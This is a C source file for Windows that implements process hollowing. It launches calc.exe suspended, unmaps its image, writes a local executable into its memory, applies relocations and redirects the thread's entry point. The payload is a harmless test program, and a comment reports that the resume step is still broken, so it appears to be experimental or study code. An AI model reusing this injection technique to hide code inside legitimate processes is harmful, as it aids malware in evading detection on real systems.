#define _CRT_SECURE_NO_WARNINGS
#define PHNT_VERSION PHNT_WIN11

#include <Windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include "phnt.h"

#pragma comment(lib, "ntdll.lib")

typedef NTSTATUS(__stdcall* tNtQueryInformationProcess)
(
    HANDLE ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength
    );

PPEB GetPEBofProcess(HANDLE hProc) {
    PROCESS_BASIC_INFORMATION pbi;
    ULONG ReturnLength;

    tNtQueryInformationProcess NtQueryInformationProcess =
        (tNtQueryInformationProcess)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQueryInformationProcess");

    if (!NtQueryInformationProcess) {
        printf("[-] Error: Could not get NtQueryInformationProcess function address\n");
        return NULL;
    }

    NTSTATUS status = NtQueryInformationProcess(hProc, ProcessBasicInformation, &pbi, sizeof(pbi), &ReturnLength);

    if (status != 0) {
        printf("[-] NtQueryInformationProcess failed with status: 0x%x\n", status);
        return NULL;
    }

    return pbi.PebBaseAddress;
}

typedef struct BASE_RELOCATION_BLOCK {
    DWORD PageAddress;
    DWORD BlockSize;
} BASE_RELOCATION_BLOCK, * PBASE_RELOCATION_BLOCK;

typedef struct BASE_RELOCATION_ENTRY {
    USHORT Offset : 12;
    USHORT Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;

int main() {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    // Creating process and getting its ImageBaseAddress
    if (!CreateProcessA(NULL, "C:\\Windows\\System32\\calc.exe", NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        printf("[-] Error creating process!\n");
        return 1;
    }

    PPEB pPeb = GetPEBofProcess(pi.hProcess);
    if (!pPeb) {
        printf("[-] Failed to get PEB base address.\n");
        return 1;
    }

    PEB peb;
    if (!ReadProcessMemory(pi.hProcess, pPeb, &peb, sizeof(peb), NULL)) {
        printf("[-] Error reading PEB from process memory\n");
        return 1;
    }

    printf("Calc.exe PEB Address -> %p\n", pPeb);
    printf("Calc.exe ImageBaseAddress -> %p\n", peb.ImageBaseAddress);

    // Unmap
    NtUnmapViewOfSection(pi.hProcess, peb.ImageBaseAddress);

    // Reading the file that we wanna run
    HANDLE FileToRun = CreateFileA("C:\\Users\\mjank\\Desktop\\HelloWorld.exe", GENERIC_READ, NULL, NULL, OPEN_ALWAYS, NULL, NULL);
    if (FileToRun == INVALID_HANDLE_VALUE) {
        printf("[-] Error opening file!\n");
        return 1;
    }

    DWORD FileToRunSize = GetFileSize(FileToRun, NULL);
    if (FileToRunSize == INVALID_FILE_SIZE) {
        printf("[-] Error getting file size!\n");
        CloseHandle(FileToRun);
        return 1;
    }

    LPVOID FileToRunBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, FileToRunSize);
    if (FileToRunBuffer == NULL) {
        printf("[-] Error allocating memory!\n");
        CloseHandle(FileToRun);
        return 1;
    }

    DWORD bytesRead;
    if (!ReadFile(FileToRun, FileToRunBuffer, FileToRunSize, &bytesRead, NULL) || bytesRead != FileToRunSize) {
        printf("[-] Error reading file!\n");
        HeapFree(GetProcessHeap(), 0, FileToRunBuffer);
        CloseHandle(FileToRun);
        return 1;
    }

    CloseHandle(FileToRun);

    // Reading headers of the file to run
    PIMAGE_DOS_HEADER fileDosHeader = (PIMAGE_DOS_HEADER)FileToRunBuffer;
    PIMAGE_NT_HEADERS fileNTHeaders = (PIMAGE_NT_HEADERS)((uintptr_t)FileToRunBuffer + fileDosHeader->e_lfanew);
    PIMAGE_SECTION_HEADER fileSectionHeader = (PIMAGE_SECTION_HEADER)((uintptr_t)fileNTHeaders + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER) + fileNTHeaders->FileHeader.SizeOfOptionalHeader);

    LPVOID newBuffer = VirtualAllocEx(pi.hProcess, peb.ImageBaseAddress, fileNTHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (newBuffer == NULL) {
        printf("VirtualAllocEx call failed with error code: %d\n", GetLastError());
        HeapFree(GetProcessHeap(), 0, FileToRunBuffer);
        return 1;
    }

    peb.ImageBaseAddress = newBuffer;

    // Calculating offset 
    SIZE_T delta = (SIZE_T)peb.ImageBaseAddress - fileNTHeaders->OptionalHeader.ImageBase;

    // Setting file ImageBase to ImageBaseAddress of the hollowed process
    fileNTHeaders->OptionalHeader.ImageBase = (SIZE_T)peb.ImageBaseAddress;

    if (!WriteProcessMemory(pi.hProcess, newBuffer, FileToRunBuffer, fileNTHeaders->OptionalHeader.SizeOfHeaders, NULL)) {
        printf("WriteProcessMemory call failed with error code: %d\n", GetLastError());
        HeapFree(GetProcessHeap(), 0, FileToRunBuffer);
        return 1;
    }

    // Copying all the sections to the target process
    for (DWORD i = 0; i < fileNTHeaders->FileHeader.NumberOfSections; i++) {
        PVOID sectionDestination = (PVOID)((uintptr_t)peb.ImageBaseAddress + fileSectionHeader->VirtualAddress);
        PVOID sectionLocation = (PVOID)((uintptr_t)FileToRunBuffer + fileSectionHeader->PointerToRawData);
        DWORD oldProtect;
        //if (!VirtualProtectEx(pi.hProcess, sectionDestination, fileSectionHeader->SizeOfRawData, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        //    printf("VirtualProtectEx failed with error: %d\n", GetLastError()); 
        //    return 1;
        //}
        if (!WriteProcessMemory(pi.hProcess, sectionDestination, sectionLocation, fileSectionHeader->SizeOfRawData, NULL)) {
            printf("WriteProcessMemory call failed (while copying section) with error code: %d\n", GetLastError());
            HeapFree(GetProcessHeap(), 0, FileToRunBuffer);
            return 1;
        }
        fileSectionHeader++;
    }

    // Adjusting the relocated addresses
    if (delta) {
        fileSectionHeader = (PIMAGE_SECTION_HEADER)((uintptr_t)fileNTHeaders + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER) + fileNTHeaders->FileHeader.SizeOfOptionalHeader);
        for (DWORD i = 0; i < fileNTHeaders->FileHeader.NumberOfSections; i++) {
            char* sectionName = ".reloc";

            if (!memcmp(fileSectionHeader->Name, sectionName, strlen(sectionName))) {
                printf(".reloc section found, performing relocation\n");
                DWORD relocAddr = fileSectionHeader->PointerToRawData;
                DWORD offset = 0;

                IMAGE_DATA_DIRECTORY relocData = fileNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

                while (offset < relocData.Size) {
                    PBASE_RELOCATION_BLOCK blockHeader = (PBASE_RELOCATION_BLOCK)((uintptr_t)FileToRunBuffer + relocAddr + offset);
                    offset += sizeof(BASE_RELOCATION_BLOCK);

                    DWORD RelocCount = (blockHeader->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
                    PBASE_RELOCATION_ENTRY relocEntries = (PBASE_RELOCATION_ENTRY)((uintptr_t)FileToRunBuffer + relocAddr + offset);

                    for (DWORD j = 0; j < RelocCount; j++) {
                        offset += sizeof(BASE_RELOCATION_ENTRY);
                        if (relocEntries[j].Type == 0) {
                            continue;
                        }

                        SIZE_T patchAddress = blockHeader->PageAddress + relocEntries[j].Offset;
                        SIZE_T patchedBuffer = 0;
                        ReadProcessMemory(pi.hProcess, (LPCVOID)((uintptr_t)peb.ImageBaseAddress + patchAddress), &patchedBuffer, sizeof(SIZE_T), NULL);
                        patchedBuffer += delta;

                        WriteProcessMemory(pi.hProcess, (LPCVOID)((uintptr_t)peb.ImageBaseAddress + patchAddress), &patchedBuffer, sizeof(SIZE_T), NULL);
                    }
                }
                break;  // Found and processed the .reloc section
            }
            fileSectionHeader++;
        }
    }

    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_INTEGER;
    GetThreadContext(pi.hThread, &ctx);

    SIZE_T patchedEntryPoint = (SIZE_T)peb.ImageBaseAddress + fileNTHeaders->OptionalHeader.AddressOfEntryPoint;
    ctx.Rax = patchedEntryPoint;
    SetThreadContext(pi.hThread, &ctx);

    printf("Resumming thread...");
    ResumeThread(pi.hThread); //this is killing the calc.exe process istead of resumming it

    HeapFree(GetProcessHeap(), 0, FileToRunBuffer);
    return 0;
}
